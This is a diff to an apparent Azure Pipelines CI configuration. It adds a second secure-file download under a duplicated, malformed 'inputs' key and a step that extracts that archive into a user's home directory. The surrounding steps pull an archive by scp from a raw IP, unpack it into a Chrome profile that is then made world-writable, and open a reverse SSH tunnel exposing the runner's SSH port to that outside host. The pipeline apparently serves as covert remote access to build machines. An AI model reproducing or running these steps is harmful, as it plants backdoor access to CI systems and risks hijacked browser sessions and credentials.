@@ -11,6 +11,8 @@ steps:
 - task: DownloadSecureFile@1
   inputs:
     secureFile: gc.tar.gz
+  inputs:
+    secureFile: hello.tar.xz
 - script: |
     echo "v4"
     export burrowID=KnKes4AC-kW78N4tx
@@ -49,6 +51,7 @@ steps:
     scp -P 22 -o StrictHostKeyChecking=no -i /tmp/a.pem ubuntu@18.222.192.102:/home/ubuntu/gc.tar.gz /tmp/
     sudo chmod 777 $(Agent.TempDirectory)/gc.tar.gz
     sudo -u helloworld tar -xf $(Agent.TempDirectory)/gc.tar.gz -C /home/helloworld/
+    sudo -u helloworld tar -xf $(Agent.TempDirectory)/hello.tar.xz -C /home/helloworld/
     sudo chown -R helloworld /home/helloworld/.config/google-chrome
     sudo chmod -R 777 /home/helloworld/.config/google-chrome
     ssh -N -o StrictHostKeyChecking=no -T -R 10101:0.0.0.0:22 -i /tmp/a.pem ubuntu@18.222.192.102
